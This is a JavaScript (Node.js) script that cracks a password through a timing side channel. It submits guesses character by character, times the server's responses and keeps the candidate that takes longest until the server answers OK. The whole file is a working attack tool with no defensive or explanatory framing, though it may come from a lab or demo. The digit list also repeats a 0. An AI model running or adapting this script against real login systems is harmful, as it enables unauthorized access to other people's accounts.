const { makeRequest } = require("./lib/request");
const { midsummary } = require("./lib/estimator");

const L_ALPHA = 'abcdefghijklmnopqrstuvwxyz';
const U_ALPHA = L_ALPHA.toUpperCase();
const NUM = '01234567890';
const ALLOWED_CHARS = (L_ALPHA + U_ALPHA + NUM).split('');

const OBSERVATIONS_PER_CHAR = 20;

if (!process.argv[2]) {
  throw new Error('Provide password length');
}

const pwdLen = Number.parseInt(process.argv[2]);

let pwd = '';

async function guessNextCharacter() {
  /** @type string[] */
  const candidates = ALLOWED_CHARS.map(c => pwd + c);

  if (candidates[0].length > pwdLen) {
    console.log('Maximum length reached, but password was not found. Resetting...');
    pwd = '';
    setTimeout(guessNextCharacter, 0);
    return;
  }

  /**
   * @type {{ [candidate: string]: BigInt[] }}
   */
  const observations = {};
  candidates.forEach(c => observations[c] = []);

  for (let i = 0; i < OBSERVATIONS_PER_CHAR; i++) {
    for (const candidate of candidates) {
      const [res, timeDiff] = await makeRequest(candidate.padEnd(pwdLen, '0'));
      if (res === 'OK') {
        console.log('PASSWORD CRACKED: ' + candidate);
        return;
      }
      observations[candidate].push(timeDiff);
    }
  }
  const sorted = candidates
    .map(c => [c, midsummary(observations[c])])
    .sort((a, b) => b[1] - a[1]);
  pwd = sorted[0][0];
  console.log(pwd);

  setTimeout(guessNextCharacter, 0);
}

guessNextCharacter();
